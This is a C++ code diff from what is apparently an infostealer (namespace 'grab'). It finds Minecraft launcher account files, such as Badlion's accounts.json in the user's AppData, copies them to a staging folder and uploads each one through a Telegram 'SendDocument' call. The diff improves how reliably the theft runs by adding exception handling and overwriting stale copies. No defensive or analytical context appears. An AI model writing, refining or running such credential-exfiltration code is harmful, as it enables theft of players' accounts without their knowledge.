@@ -33,17 +33,23 @@ namespace grab {
             {"Badlion", fs::path(appDataEnv) / "Badlion Client" / "accounts.json"}
         };
 
-        std::size_t keys = minecraftPaths.size();
-
         fs::create_directories(saveTo);
 
         for (const auto& [key, value] : minecraftPaths) {
             if (fs::exists(value)) {
-                Debug::Log(value.string() + " Exists!");
-                fs::copy_file(value, saveTo / (key + "_accounts.txt"));
+                try {
+                    Debug::Log(value.string() + " Exists!");
+                    fs::path file = saveTo / (std::string(key) + "_accounts.txt");
 
-                fs::path file = saveTo / (key + "_accounts.txt");
-                telegram::SendDocument(file.string());
+                    if (fs::exists(file)) fs::remove(file);
+
+                    fs::copy_file(value, saveTo / (key + "_accounts.txt"));
+
+                    telegram::SendDocument(file.string());
+                }
+                catch (const fs::filesystem_error& e) {
+                    Debug::LogError(e.what());
+                }
             }
         }
     }
